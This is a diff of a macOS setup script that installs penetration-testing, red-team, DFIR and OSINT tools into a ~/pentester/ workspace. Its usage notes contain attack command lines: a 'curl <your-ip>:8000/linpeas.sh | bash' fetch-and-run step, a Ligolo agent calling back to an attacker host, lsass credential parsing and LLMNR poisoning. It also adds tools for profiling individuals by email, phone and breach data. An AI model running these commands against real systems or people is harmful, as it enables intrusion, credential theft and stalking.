@@ -9,9 +9,11 @@ set -Eeuo pipefail
 # Author : srhoe (https://github.com/srhoe)
 # Repo   : https://github.com/srhoe/mac-cyber-bootstrap
 #
+# All tools and workspaces are organized under ~/pentester/
+#
 # Categories:
 #   - Core / Terminal Tooling
-#   - Recon / OSINT / Bug Bounty
+#   - Recon / OSINT
 #   - Web Application Testing
 #   - Network / Protocol Analysis
 #   - Credential / Password Attacks
@@ -93,24 +95,28 @@ ensure_shell_profile() {
 }
 
 ### ---------- dirs ----------
+# Everything lives under ~/pentester/ for a clean workspace
 create_dirs() {
-  log "Creating workspace directories..."
-  mkdir -p "$HOME/tools"
-  mkdir -p "$HOME/labs"
-  mkdir -p "$HOME/wordlists"
-  mkdir -p "$HOME/screenshots"
-  mkdir -p "$HOME/reports"
-  mkdir -p "$HOME/malware-samples"
-  mkdir -p "$HOME/memory-dumps"
-  mkdir -p "$HOME/pcaps"
+  log "Creating pentester workspace directories..."
+  mkdir -p "$HOME/pentester/tools"
+  mkdir -p "$HOME/pentester/labs"
+  mkdir -p "$HOME/pentester/wordlists"
+  mkdir -p "$HOME/pentester/screenshots"
+  mkdir -p "$HOME/pentester/reports"
+  mkdir -p "$HOME/pentester/malware-samples"
+  mkdir -p "$HOME/pentester/memory-dumps"
+  mkdir -p "$HOME/pentester/pcaps"
+  mkdir -p "$HOME/pentester/osint"
+  mkdir -p "$HOME/pentester/osint/targets"
+  mkdir -p "$HOME/pentester/osint/reports"
+  mkdir -p "$HOME/pentester/osint/dumps"
   mkdir -p "$HOME/.local/bin"
   mkdir -p "$HOME/go/bin"
   mkdir -p "$HOME/.gf"
-  ok "Directories created."
+  ok "Pentester workspace created at ~/pentester/"
 }
 
 ### ---------- brew helpers ----------
-
 # FIX (issue reported by HappyG): guard with `brew list` BEFORE any brew
 # invocation so no metadata fetch/download occurs for installed packages.
 is_formula_installed() { brew list --formula "$1" >/dev/null 2>&1; }
@@ -170,10 +176,12 @@ install_formulae() {
     whois inetutils
     dnsrecon         # DNS zone transfer, brute force, reverse lookup
     fierce           # DNS recon / subdomain brute forcing
-    shodan           # Shodan CLI
+    shodan           # Shodan CLI — query internet-facing assets
     exiftool         # deep file metadata extraction
     metagoofil       # metadata from public documents
     osquery          # live endpoint forensics and querying
+    spiderfoot       # automated OSINT — domains, IPs, emails, usernames
+    maltego          # OSINT link analysis (also a GUI cask below)
 
     # -----------------------------------------------
     # WEB APPLICATION TESTING
@@ -307,7 +315,7 @@ install_casks() {
     caido            # modern Burp alternative
     proxyman         # native macOS HTTP/HTTPS proxy debugger
     bloodhound       # AD attack path visualization
-    maltego          # OSINT / link analysis
+    maltego          # OSINT / link analysis GUI
     cutter           # Rizin/Radare2 GUI for reverse engineering
     ghidra           # NSA reverse engineering suite (free IDA alternative)
 
@@ -338,7 +346,10 @@ setup_pipx() {
   pipx ensurepath || true
 
   local pipx_apps=(
-    # Web / Bug Bounty
+
+    # -----------------------------------------------
+    # WEB / BUG BOUNTY
+    # -----------------------------------------------
     dirsearch        # web path brute forcing
     paramspider      # mine URLs for parameters from web archives
     mitmproxy        # HTTPS MITM proxy
@@ -349,7 +360,9 @@ setup_pipx() {
     corscanner       # CORS misconfiguration scanner
     smuggler         # HTTP request smuggling detector
 
-    # Active Directory / Windows
+    # -----------------------------------------------
+    # ACTIVE DIRECTORY / WINDOWS
+    # -----------------------------------------------
     impacket         # Windows protocol suite — SMB, Kerberos, NTLM
     bloodhound-python # BloodHound data collector from Linux/macOS
     certipy-ad       # AD Certificate Services abuse (ESC1-ESC8)
@@ -361,22 +374,40 @@ setup_pipx() {
     coercer          # coerce Windows hosts to authenticate
     enum4linux       # classic SMB enumeration script
 
-    # Red Team / Exploitation
+    # -----------------------------------------------
+    # RED TEAM / EXPLOITATION
+    # -----------------------------------------------
     pwntools         # CTF binary exploitation framework
 
-    # Cloud Security
+    # -----------------------------------------------
+    # CLOUD SECURITY
+    # -----------------------------------------------
     pacu             # AWS exploitation framework
     scoutsuite       # multi-cloud security auditing (AWS/Azure/GCP)
     s3scanner        # find open/misconfigured S3 buckets
 
-    # Blue Team / DFIR / Malware Analysis
+    # -----------------------------------------------
+    # BLUE TEAM / DFIR / MALWARE ANALYSIS
+    # -----------------------------------------------
     volatility3      # memory forensics — analyze RAM dumps
     oletools         # analyze Office macros and OLE documents
     pdfid            # detect malicious PDF indicators
     floss            # advanced string extraction from binaries
     yara-python      # YARA Python bindings
 
-    # Utility
+    # -----------------------------------------------
+    # OSINT
+    # -----------------------------------------------
+    sherlock-project  # username enumeration across 400+ platforms
+    holehe           # check if email is registered on sites
+    maigret          # deep username OSINT (400+ sites + analysis)
+    social-analyzer  # social media presence analyzer
+    phoneinfoga      # phone number OSINT framework
+    h8mail           # email breach hunter (HIBP, breach data)
+
+    # -----------------------------------------------
+    # UTILITY
+    # -----------------------------------------------
     cython           # compile Python to C (useful in CTF reversing)
   )
 
@@ -476,6 +507,9 @@ setup_go_tools() {
     # blue team / DFIR
     github.com/Yamato-Security/hayabusa@latest # Windows event log forensics
 
+    # osint
+    github.com/projectdiscovery/uncover/cmd/uncover@latest  # Shodan/Fofa/Censys CLI
+
     # misc
     github.com/RedTeamPentesting/pretender@latest  # LLMNR/NBNS/mDNS spoofer
   )
@@ -500,17 +534,17 @@ install_manual_tools() {
   fi
 
   # pwndbg — GDB enhancement for binary exploitation / pwn CTFs
-  if [[ -d "$HOME/tools/pwndbg" ]]; then
+  if [[ -d "$HOME/pentester/tools/pwndbg" ]]; then
     ok "pwndbg already cloned"
     if ! grep -q "pwndbg" "$HOME/.gdbinit" 2>/dev/null; then
-      cd "$HOME/tools/pwndbg" && ./setup.sh || warn "pwndbg setup.sh failed"
+      cd "$HOME/pentester/tools/pwndbg" && ./setup.sh || warn "pwndbg setup.sh failed"
       cd "$HOME"
     fi
   else
     log "Cloning and installing pwndbg..."
-    git clone --depth=1 https://github.com/pwndbg/pwndbg "$HOME/tools/pwndbg" && \
-      cd "$HOME/tools/pwndbg" && ./setup.sh || \
-      warn "pwndbg install failed — run $HOME/tools/pwndbg/setup.sh manually"
+    git clone --depth=1 https://github.com/pwndbg/pwndbg "$HOME/pentester/tools/pwndbg" && \
+      cd "$HOME/pentester/tools/pwndbg" && ./setup.sh || \
+      warn "pwndbg install failed — run $HOME/pentester/tools/pwndbg/setup.sh manually"
     cd "$HOME"
   fi
 
@@ -528,8 +562,8 @@ install_manual_tools() {
 setup_gf_patterns() {
   log "Setting up gf patterns..."
   mkdir -p "$HOME/.gf"
-  if [[ -d "$HOME/tools/Gf-Patterns" ]]; then
-    cp "$HOME/tools/Gf-Patterns/"*.json "$HOME/.gf/" 2>/dev/null || true
+  if [[ -d "$HOME/pentester/tools/Gf-Patterns" ]]; then
+    cp "$HOME/pentester/tools/Gf-Patterns/"*.json "$HOME/.gf/" 2>/dev/null || true
     ok "gf patterns installed to ~/.gf"
   else
     warn "Gf-Patterns repo not found — run clone_repos first."
@@ -551,70 +585,103 @@ clone_repos() {
   log "Cloning security repos and wordlists..."
 
   # Wordlists
-  clone_repo_if_missing "https://github.com/danielmiessler/SecLists.git"                      "$HOME/wordlists/SecLists"
-  clone_repo_if_missing "https://github.com/assetnote/wordlists.git"                          "$HOME/wordlists/assetnote"
-  clone_repo_if_missing "https://github.com/Bo0oM/fuzz.txt.git"                               "$HOME/wordlists/fuzz.txt"
-  clone_repo_if_missing "https://github.com/danielmiessler/RobotsDisallowed.git"              "$HOME/wordlists/RobotsDisallowed"
+  clone_repo_if_missing "https://github.com/danielmiessler/SecLists.git"                      "$HOME/pentester/wordlists/SecLists"
+  clone_repo_if_missing "https://github.com/assetnote/wordlists.git"                          "$HOME/pentester/wordlists/assetnote"
+  clone_repo_if_missing "https://github.com/Bo0oM/fuzz.txt.git"                               "$HOME/pentester/wordlists/fuzz.txt"
+  clone_repo_if_missing "https://github.com/danielmiessler/RobotsDisallowed.git"              "$HOME/pentester/wordlists/RobotsDisallowed"
 
   # Payload / Reference
-  clone_repo_if_missing "https://github.com/swisskyrepo/PayloadsAllTheThings.git"             "$HOME/tools/PayloadsAllTheThings"
-  clone_repo_if_missing "https://github.com/payloadbox/xss-payload-list.git"                  "$HOME/tools/xss-payloads"
-  clone_repo_if_missing "https://github.com/payloadbox/sql-injection-payload-list.git"        "$HOME/tools/sqli-payloads"
-  clone_repo_if_missing "https://github.com/payloadbox/ssti-payloads.git"                     "$HOME/tools/ssti-payloads"
+  clone_repo_if_missing "https://github.com/swisskyrepo/PayloadsAllTheThings.git"             "$HOME/pentester/tools/PayloadsAllTheThings"
+  clone_repo_if_missing "https://github.com/payloadbox/xss-payload-list.git"                  "$HOME/pentester/tools/xss-payloads"
+  clone_repo_if_missing "https://github.com/payloadbox/sql-injection-payload-list.git"        "$HOME/pentester/tools/sqli-payloads"
+  clone_repo_if_missing "https://github.com/payloadbox/ssti-payloads.git"                     "$HOME/pentester/tools/ssti-payloads"
 
   # Web / Bug Bounty
-  clone_repo_if_missing "https://github.com/s0md3v/XSStrike.git"                              "$HOME/tools/XSStrike"
-  clone_repo_if_missing "https://github.com/EnableSecurity/wafw00f.git"                       "$HOME/tools/wafw00f-src"
-  clone_repo_if_missing "https://github.com/laramies/theHarvester.git"                        "$HOME/tools/theHarvester-src"
-  clone_repo_if_missing "https://github.com/m4ll0k/SecretFinder.git"                         "$HOME/tools/SecretFinder"
-  clone_repo_if_missing "https://github.com/GerbenJavado/LinkFinder.git"                     "$HOME/tools/LinkFinder"
-  clone_repo_if_missing "https://github.com/s0md3v/Corsy.git"                                "$HOME/tools/Corsy"
-  clone_repo_if_missing "https://github.com/defparam/smuggler.git"                            "$HOME/tools/smuggler"
+  clone_repo_if_missing "https://github.com/s0md3v/XSStrike.git"                              "$HOME/pentester/tools/XSStrike"
+  clone_repo_if_missing "https://github.com/EnableSecurity/wafw00f.git"                       "$HOME/pentester/tools/wafw00f-src"
+  clone_repo_if_missing "https://github.com/laramies/theHarvester.git"                        "$HOME/pentester/tools/theHarvester-src"
+  clone_repo_if_missing "https://github.com/m4ll0k/SecretFinder.git"                         "$HOME/pentester/tools/SecretFinder"
+  clone_repo_if_missing "https://github.com/GerbenJavado/LinkFinder.git"                     "$HOME/pentester/tools/LinkFinder"
+  clone_repo_if_missing "https://github.com/s0md3v/Corsy.git"                                "$HOME/pentester/tools/Corsy"
+  clone_repo_if_missing "https://github.com/defparam/smuggler.git"                            "$HOME/pentester/tools/smuggler"
 
   # Active Directory / Windows
-  clone_repo_if_missing "https://github.com/PowerShellMafia/PowerSploit.git"                  "$HOME/tools/PowerSploit"
-  clone_repo_if_missing "https://github.com/lgandx/Responder.git"                             "$HOME/tools/Responder"
-  clone_repo_if_missing "https://github.com/itm4n/PrivescCheck.git"                           "$HOME/tools/PrivescCheck"
-  clone_repo_if_missing "https://github.com/ly4k/Certipy.git"                                 "$HOME/tools/Certipy"
-  clone_repo_if_missing "https://github.com/p0dalirius/Coercer.git"                           "$HOME/tools/Coercer"
-  clone_repo_if_missing "https://github.com/dirkjanm/BloodHound.py.git"                       "$HOME/tools/BloodHound.py"
-  clone_repo_if_missing "https://github.com/dirkjanm/mitm6.git"                               "$HOME/tools/mitm6"
-  clone_repo_if_missing "https://github.com/Kevin-Robertson/Inveigh.git"                      "$HOME/tools/Inveigh"
+  clone_repo_if_missing "https://github.com/PowerShellMafia/PowerSploit.git"                  "$HOME/pentester/tools/PowerSploit"
+  clone_repo_if_missing "https://github.com/lgandx/Responder.git"                             "$HOME/pentester/tools/Responder"
+  clone_repo_if_missing "https://github.com/itm4n/PrivescCheck.git"                           "$HOME/pentester/tools/PrivescCheck"
+  clone_repo_if_missing "https://github.com/ly4k/Certipy.git"                                 "$HOME/pentester/tools/Certipy"
+  clone_repo_if_missing "https://github.com/p0dalirius/Coercer.git"                           "$HOME/pentester/tools/Coercer"
+  clone_repo_if_missing "https://github.com/dirkjanm/BloodHound.py.git"                       "$HOME/pentester/tools/BloodHound.py"
+  clone_repo_if_missing "https://github.com/dirkjanm/mitm6.git"                               "$HOME/pentester/tools/mitm6"
+  clone_repo_if_missing "https://github.com/Kevin-Robertson/Inveigh.git"                      "$HOME/pentester/tools/Inveigh"
 
   # Privilege Escalation
-  clone_repo_if_missing "https://github.com/carlospolop/PEASS-ng.git"                         "$HOME/tools/PEASS-ng"
-  clone_repo_if_missing "https://github.com/rebootuser/LinEnum.git"                           "$HOME/tools/LinEnum"
-  clone_repo_if_missing "https://github.com/DominicBreuker/pspy.git"                          "$HOME/tools/pspy"
+  clone_repo_if_missing "https://github.com/carlospolop/PEASS-ng.git"                         "$HOME/pentester/tools/PEASS-ng"
+  clone_repo_if_missing "https://github.com/rebootuser/LinEnum.git"                           "$HOME/pentester/tools/LinEnum"
+  clone_repo_if_missing "https://github.com/DominicBreuker/pspy.git"                          "$HOME/pentester/tools/pspy"
 
   # Red Team / Post-Exploitation
-  clone_repo_if_missing "https://github.com/Flangvik/SharpCollection.git"                     "$HOME/tools/SharpCollection"
+  clone_repo_if_missing "https://github.com/Flangvik/SharpCollection.git"                     "$HOME/pentester/tools/SharpCollection"
 
   # Blue Team / DFIR / Malware Analysis
-  clone_repo_if_missing "https://github.com/volatilityfoundation/volatility3.git"             "$HOME/tools/volatility3"
-  clone_repo_if_missing "https://github.com/SigmaHQ/sigma.git"                               "$HOME/tools/sigma"
-  clone_repo_if_missing "https://github.com/Neo23x0/YARA-Rules.git"                          "$HOME/tools/YARA-Rules"
-  clone_repo_if_missing "https://github.com/mandiant/capa.git"                                "$HOME/tools/capa"
-  clone_repo_if_missing "https://github.com/WithSecureLabs/chainsaw.git"                      "$HOME/tools/chainsaw"
-  clone_repo_if_missing "https://github.com/Yamato-Security/hayabusa.git"                     "$HOME/tools/hayabusa"
+  clone_repo_if_missing "https://github.com/volatilityfoundation/volatility3.git"             "$HOME/pentester/tools/volatility3"
+  clone_repo_if_missing "https://github.com/SigmaHQ/sigma.git"                               "$HOME/pentester/tools/sigma"
+  clone_repo_if_missing "https://github.com/Neo23x0/YARA-Rules.git"                          "$HOME/pentester/tools/YARA-Rules"
+  clone_repo_if_missing "https://github.com/mandiant/capa.git"                                "$HOME/pentester/tools/capa"
+  clone_repo_if_missing "https://github.com/WithSecureLabs/chainsaw.git"                      "$HOME/pentester/tools/chainsaw"
+  clone_repo_if_missing "https://github.com/Yamato-Security/hayabusa.git"                     "$HOME/pentester/tools/hayabusa"
 
   # Cloud Security
-  clone_repo_if_missing "https://github.com/RhinoSecurityLabs/pacu.git"                       "$HOME/tools/pacu"
-  clone_repo_if_missing "https://github.com/nccgroup/ScoutSuite.git"                          "$HOME/tools/ScoutSuite"
-  clone_repo_if_missing "https://github.com/BishopFox/cloudfox.git"                          "$HOME/tools/cloudfox"
-  clone_repo_if_missing "https://github.com/dirkjanm/ROADtools.git"                          "$HOME/tools/ROADtools"
-  clone_repo_if_missing "https://github.com/fox-it/TeamFiltration.git"                       "$HOME/tools/TeamFiltration"
-  clone_repo_if_missing "https://github.com/andresriancho/enumerate-iam.git"                 "$HOME/tools/enumerate-iam"
+  clone_repo_if_missing "https://github.com/RhinoSecurityLabs/pacu.git"                       "$HOME/pentester/tools/pacu"
+  clone_repo_if_missing "https://github.com/nccgroup/ScoutSuite.git"                          "$HOME/pentester/tools/ScoutSuite"
+  clone_repo_if_missing "https://github.com/BishopFox/cloudfox.git"                          "$HOME/pentester/tools/cloudfox"
+  clone_repo_if_missing "https://github.com/dirkjanm/ROADtools.git"                          "$HOME/pentester/tools/ROADtools"
+  clone_repo_if_missing "https://github.com/fox-it/TeamFiltration.git"                       "$HOME/pentester/tools/TeamFiltration"
+  clone_repo_if_missing "https://github.com/andresriancho/enumerate-iam.git"                 "$HOME/pentester/tools/enumerate-iam"
 
   # Reverse Engineering
-  clone_repo_if_missing "https://github.com/pwndbg/pwndbg.git"                               "$HOME/tools/pwndbg"
-  clone_repo_if_missing "https://github.com/JonathanSalwan/ROPgadget.git"                    "$HOME/tools/ROPgadget"
+  clone_repo_if_missing "https://github.com/pwndbg/pwndbg.git"                               "$HOME/pentester/tools/pwndbg"
+  clone_repo_if_missing "https://github.com/JonathanSalwan/ROPgadget.git"                    "$HOME/pentester/tools/ROPgadget"
+
+  # OSINT
+  clone_repo_if_missing "https://github.com/sherlock-project/sherlock.git"                    "$HOME/pentester/osint/sherlock"
+  clone_repo_if_missing "https://github.com/megadose/holehe.git"                              "$HOME/pentester/osint/holehe"
+  clone_repo_if_missing "https://github.com/soxoj/maigret.git"                               "$HOME/pentester/osint/maigret"
+  clone_repo_if_missing "https://github.com/smicallef/spiderfoot.git"                        "$HOME/pentester/osint/spiderfoot"
+  clone_repo_if_missing "https://github.com/sundowndev/phoneinfoga.git"                       "$HOME/pentester/osint/phoneinfoga"
+  clone_repo_if_missing "https://github.com/khast3x/h8mail.git"                              "$HOME/pentester/osint/h8mail"
+  clone_repo_if_missing "https://github.com/laramies/theHarvester.git"                        "$HOME/pentester/osint/theHarvester"
+  clone_repo_if_missing "https://github.com/lanmaster53/recon-ng.git"                         "$HOME/pentester/osint/recon-ng"
+  clone_repo_if_missing "https://github.com/Datalux/Osintgram.git"                            "$HOME/pentester/osint/osintgram"
+  clone_repo_if_missing "https://github.com/mxrch/GHunt.git"                                  "$HOME/pentester/osint/ghunt"
 
   # Automation / Workflow
-  clone_repo_if_missing "https://github.com/projectdiscovery/nuclei-templates.git"            "$HOME/tools/nuclei-templates"
-  clone_repo_if_missing "https://github.com/projectdiscovery/fuzzing-templates.git"           "$HOME/tools/fuzzing-templates"
-  clone_repo_if_missing "https://github.com/1ndianl33t/Gf-Patterns.git"                      "$HOME/tools/Gf-Patterns"
-  clone_repo_if_missing "https://github.com/Tib3rius/AutoRecon.git"                           "$HOME/tools/AutoRecon"
-  clone_repo_if_missing "https://github.com/21y4d/nmapAutomator.git"                          "$HOME/tools/nmapAutomator"
+  clone_repo_if_missing "https://github.com/projectdiscovery/nuclei-templates.git"            "$HOME/pentester/tools/nuclei-templates"
+  clone_repo_if_missing "https://github.com/projectdiscovery/fuzzing-templates.git"           "$HOME/pentester/tools/fuzzing-templates"
+  clone_repo_if_missing "https://github.com/1ndianl33t/Gf-Patterns.git"                      "$HOME/pentester/tools/Gf-Patterns"
+  clone_repo_if_missing "https://github.com/Tib3rius/AutoRecon.git"                           "$HOME/pentester/tools/AutoRecon"
+  clone_repo_if_missing "https://github.com/21y4d/nmapAutomator.git"                          "$HOME/pentester/tools/nmapAutomator"
+}
+
+### ---------- volatility3 venv ----------
+setup_volatility3() {
+  log "Setting up volatility3 Python venv..."
+  local vol_dir="$HOME/pentester/tools/volatility3"
+
+  if [[ ! -d "$vol_dir" ]]; then
+    warn "volatility3 repo not found — run clone_repos first."
+    return
+  fi
+
+  if [[ ! -d "$vol_dir/venv" ]]; then
+    python3 -m venv "$vol_dir/venv"
+  fi
+
+  "$vol_dir/venv/bin/pip" install --upgrade pip --quiet
+  "$vol_dir/venv/bin/pip" install volatility3 --quiet || \
+    warn "volatility3 pip install failed"
+
+  ok "volatility3 venv ready."
 }
 
 ### ---------- aliases / shell config ----------
@@ -642,20 +709,25 @@ write_shell_config() {
   append_once 'export PATH="$HOME/.local/bin:$HOME/go/bin:$HOME/.cargo/bin:$PATH"' "$rc_file"
   append_once 'export EDITOR="nvim"' "$rc_file"
 
-  # Wordlist / tool shortcuts
-  append_once 'export WORDLISTS="$HOME/wordlists/SecLists"' "$rc_file"
-  append_once 'export ASSETNOTE="$HOME/wordlists/assetnote"' "$rc_file"
-  append_once 'export PAYLOADS="$HOME/tools/PayloadsAllTheThings"' "$rc_file"
-  append_once 'export PEASS="$HOME/tools/PEASS-ng"' "$rc_file"
+  # Pentester workspace shortcuts
+  append_once 'export PENTESTER="$HOME/pentester"' "$rc_file"
+  append_once 'export TOOLS="$HOME/pentester/tools"' "$rc_file"
+  append_once 'export WORDLISTS="$HOME/pentester/wordlists/SecLists"' "$rc_file"
+  append_once 'export ASSETNOTE="$HOME/pentester/wordlists/assetnote"' "$rc_file"
+  append_once 'export PAYLOADS="$HOME/pentester/tools/PayloadsAllTheThings"' "$rc_file"
+  append_once 'export PEASS="$HOME/pentester/tools/PEASS-ng"' "$rc_file"
+  append_once 'export OSINT="$HOME/pentester/osint"' "$rc_file"
 
   # Navigation
   append_once 'alias ll="ls -lah"' "$rc_file"
-  append_once 'alias ctf="cd $HOME/labs"' "$rc_file"
-  append_once 'alias tools="cd $HOME/tools"' "$rc_file"
-  append_once 'alias wordlists="cd $HOME/wordlists"' "$rc_file"
-  append_once 'alias reports="cd $HOME/reports"' "$rc_file"
-  append_once 'alias dumps="cd $HOME/memory-dumps"' "$rc_file"
-  append_once 'alias pcaps="cd $HOME/pcaps"' "$rc_file"
+  append_once 'alias pentester="cd $HOME/pentester"' "$rc_file"
+  append_once 'alias ctf="cd $HOME/pentester/labs"' "$rc_file"
+  append_once 'alias tools="cd $HOME/pentester/tools"' "$rc_file"
+  append_once 'alias wordlists="cd $HOME/pentester/wordlists"' "$rc_file"
+  append_once 'alias reports="cd $HOME/pentester/reports"' "$rc_file"
+  append_once 'alias dumps="cd $HOME/pentester/memory-dumps"' "$rc_file"
+  append_once 'alias pcaps="cd $HOME/pentester/pcaps"' "$rc_file"
+  append_once 'alias osint="cd $HOME/pentester/osint"' "$rc_file"
 
   # Network
   append_once 'alias ports="lsof -i -P -n | grep LISTEN || true"' "$rc_file"
@@ -672,16 +744,21 @@ write_shell_config() {
   append_once 'alias nmapfull="nmap -sC -sV -p- --open"' "$rc_file"
   append_once 'alias nmapquick="nmap -sC -sV --top-ports 1000"' "$rc_file"
   append_once 'alias rustscan="rustscan --ulimit 5000"' "$rc_file"
-  append_once 'alias autorecon="python3 $HOME/tools/AutoRecon/autorecon.py"' "$rc_file"
-  append_once 'alias nmapauto="$HOME/tools/nmapAutomator/nmapAutomator.sh"' "$rc_file"
+  append_once 'alias autorecon="python3 $HOME/pentester/tools/AutoRecon/autorecon.py"' "$rc_file"
+  append_once 'alias nmapauto="$HOME/pentester/tools/nmapAutomator/nmapAutomator.sh"' "$rc_file"
 
   # AD / Windows
   append_once 'alias bloodhound-start="neo4j start && bloodhound &"' "$rc_file"
-  append_once 'alias linpeas="bash $HOME/tools/PEASS-ng/linPEAS/linpeas.sh"' "$rc_file"
+  append_once 'alias linpeas="bash $HOME/pentester/tools/PEASS-ng/linPEAS/linpeas.sh"' "$rc_file"
+  append_once 'alias responder="sudo python3 $HOME/pentester/tools/Responder/Responder.py"' "$rc_file"
 
   # DFIR
-  append_once 'alias vol="python3 $HOME/tools/volatility3/vol.py"' "$rc_file"
-  append_once 'alias vol3="python3 $HOME/tools/volatility3/vol.py"' "$rc_file"
+  append_once 'alias vol3="$HOME/pentester/tools/volatility3/venv/bin/python $HOME/pentester/tools/volatility3/vol.py"' "$rc_file"
+
+  # OSINT shortcuts
+  append_once 'alias sherlock="python3 $HOME/pentester/osint/sherlock/sherlock"' "$rc_file"
+  append_once 'alias spiderfoot="python3 $HOME/pentester/osint/spiderfoot/sf.py"' "$rc_file"
+  append_once 'alias ghunt="python3 $HOME/pentester/osint/ghunt/hunt.py"' "$rc_file"
 
   # Misc
   append_once 'alias searchsploit="searchsploit"' "$rc_file"
@@ -698,19 +775,12 @@ finalize_tools() {
     nuclei -update-templates || warn "nuclei template update failed"
   fi
 
-  if [[ -d "$HOME/tools/nuclei-templates/.git" ]]; then
-    git -C "$HOME/tools/nuclei-templates" pull || true
+  if [[ -d "$HOME/pentester/tools/nuclei-templates/.git" ]]; then
+    git -C "$HOME/pentester/tools/nuclei-templates" pull || true
   fi
 
   if command -v searchsploit >/dev/null 2>&1; then
     searchsploit -u || warn "searchsploit update failed"
-  fi
-
-  # Volatility3 dependencies
-  if [[ -d "$HOME/tools/volatility3" ]]; then
-    log "Installing volatility3 Python dependencies..."
-    pip3 install -r "$HOME/tools/volatility3/requirements.txt" || \
-      warn "volatility3 pip requirements failed — run manually"
   fi
 
   ok "Post-install tasks complete."
@@ -725,11 +795,39 @@ manual_notes() {
   https://github.com/srhoe/mac-cyber-bootstrap
 ==========================================================
 
+ALL TOOLS INSTALLED UNDER: ~/pentester/
+
+  ~/pentester/
+  ├── tools/          → cloned repos and custom tools
+  ├── labs/           → CTF and lab workspaces
+  ├── wordlists/      → SecLists, assetnote, and others
+  ├── reports/        → pentest / bug bounty reports
+  ├── screenshots/    → evidence and findings
+  ├── pcaps/          → packet captures
+  ├── memory-dumps/   → volatility3 analysis targets
+  ├── malware-samples/→ malware analysis (isolate in VM)
+  └── osint/          → OSINT workspace
+      ├── targets/    → target notes and scope
+      ├── reports/    → OSINT investigation reports
+      ├── dumps/      → data dumps
+      ├── sherlock/   → username enumeration
+      ├── holehe/     → email recon
+      ├── maigret/    → deep username OSINT
+      ├── spiderfoot/ → automated OSINT automation
+      ├── phoneinfoga/→ phone number OSINT
+      ├── h8mail/     → email breach hunter
+      ├── theHarvester/ → domain/email/subdomain recon
+      ├── recon-ng/   → modular recon framework
+      ├── osintgram/  → Instagram OSINT
+      └── ghunt/      → Google account OSINT
+
 WHAT WAS INSTALLED:
 
   Core / Terminal         git, tmux, fzf, bat, ripgrep, neovim, asciinema, glow
   Recon / OSINT           nmap, masscan, amass, subfinder, httpx, nuclei, shodan,
-                          theharvester, dnsrecon, fierce, exiftool, recon-ng
+                          theharvester, dnsrecon, fierce, exiftool, spiderfoot
+  OSINT Specific          sherlock, holehe, maigret, phoneinfoga, h8mail,
+                          osintgram, ghunt, recon-ng, maltego
   Web / Bug Bounty        ffuf, gobuster, feroxbuster, sqlmap, nikto, dalfox,
                           jwt_tool, tplmap, arjun, smuggler, corscanner, zaproxy,
                           XSStrike, LinkFinder, SecretFinder, crlfuzz, bxss
@@ -756,103 +854,63 @@ MANUAL / SPECIAL-CASE NOTES:
 
 1. Mimikatz:
    Windows-only binary — keep it in a Windows VM.
-   pypykatz is your macOS equivalent for offline credential analysis:
+   Use pypykatz on macOS for offline credential analysis:
      pypykatz lsa minidump lsass.dmp
 
 2. Sliver C2:
-   Start server:  sudo sliver-server
-   Connect:       sliver
-   Full docs:     https://sliver.sh
+   sudo sliver-server
+   sliver
+   Docs: https://sliver.sh
 
-3. Havoc C2 (NOT auto-installed — requires manual build):
-   Needs Qt5 + Golang — Linux build preferred.
-   https://github.com/HavocFramework/Havoc
-   Use Sliver as your primary open-source C2 on macOS.
+3. Volatility3:
+   vol3 -f memory.dump windows.pslist
+   vol3 -f memory.dump linux.bash
 
-4. Ghidra:
-   Requires OpenJDK 21 (installed via brew).
-   Launch: open /Applications/Ghidra.app
-   Docs:   https://ghidra-sre.org
+4. Sherlock (username OSINT):
+   sherlock <username>
+   sherlock <username> --output ~/pentester/osint/reports/
 
-5. pwndbg:
-   GDB enhancement for binary exploitation.
-   If setup failed: cd ~/tools/pwndbg && ./setup.sh
-   Run: gdb <binary>   (pwndbg loads automatically)
+5. Holehe (email OSINT):
+   holehe target@email.com
 
-6. Volatility3:
-   Usage: vol3 -f memory.dump windows.pslist
-          vol3 -f memory.dump linux.bash
-   Symbol packs download automatically on first run.
-   Docs: https://volatility3.readthedocs.io
+6. Maigret (deep username OSINT):
+   maigret <username>
 
-7. Zeek + Suricata (Blue Team):
-   Both need config for your interface.
-   Zeek:     zeek -i en0 <script>
-   Suricata: suricata -i en0 -c /opt/homebrew/etc/suricata/suricata.yaml
+7. SpiderFoot (automated OSINT):
+   spiderfoot -l 127.0.0.1:5001   (then open browser)
 
-8. Burp Suite CA Certificate:
-   Open Burp → visit http://burpsuite with proxy active
-   → Download CA cert → install in macOS Keychain → trust for SSL.
-   Proxyman auto-installs its own cert on first launch.
+8. GHunt (Google OSINT):
+   ghunt email target@gmail.com
 
-9. RustScan:
-   rustscan --ulimit 5000 -a <target> -- -sV -sC
-   (alias `rustscan` already sets --ulimit 5000)
+9. PhoneInfoga:
+   phoneinfoga scan -n "+1XXXXXXXXXX"
 
-10. Shodan CLI:
-    shodan init <YOUR_API_KEY>
-    shodan host <IP>
-
-11. BloodHound:
+10. BloodHound:
     neo4j start
-    Open BloodHound app → connect with neo4j creds
-    Run: bloodhound-python -u <user> -p <pass> -d <domain> -ns <DC-IP> -c All
+    bloodhound-python -u <user> -p <pass> -d <domain> -ns <DC-IP> -c All
 
-12. Ligolo-ng (pivoting):
-    Attacker: sudo ligolo-proxy -selfcert -laddr 0.0.0.0:11601
-    Target:   ./ligolo-agent -connect <attacker>:11601 -ignore-cert
-    Docs:     https://github.com/nicocha30/ligolo-ng
+11. Ligolo-ng (pivoting):
+    sudo ligolo-proxy -selfcert -laddr 0.0.0.0:11601
+    ./ligolo-agent -connect <attacker>:11601 -ignore-cert
 
-13. LinPEAS / WinPEAS:
-    Located: ~/tools/PEASS-ng/linPEAS/linpeas.sh
-    Host:    pyserver  (alias for python3 -m http.server 8000)
-    Target:  curl <your-ip>:8000/linpeas.sh | bash
+12. LinPEAS / WinPEAS:
+    pyserver  → curl <your-ip>:8000/linpeas.sh | bash
 
-14. Pacu (AWS exploitation):
-    pacu
-    Docs: https://github.com/RhinoSecurityLabs/pacu
+13. Shodan CLI:
+    shodan init <API_KEY>
 
-15. Responder (LLMNR/NBNS poisoning):
-    Located: ~/tools/Responder/Responder.py
-    Run:     sudo python3 ~/tools/Responder/Responder.py -I en0 -wPv
-
-16. Mullvad VPN Kill Switch:
-    Enable in Mullvad settings before any recon from public networks.
-
-17. proxychains-ng config:
-    Apple Silicon: /opt/homebrew/etc/proxychains.conf
-    Intel:         /usr/local/etc/proxychains.conf
+14. Ghidra:
+    open /Applications/Ghidra.app  (requires OpenJDK 21)
 
 FIRST-RUN CHECKLIST:
-  □ Restart Terminal
-  □ brew doctor
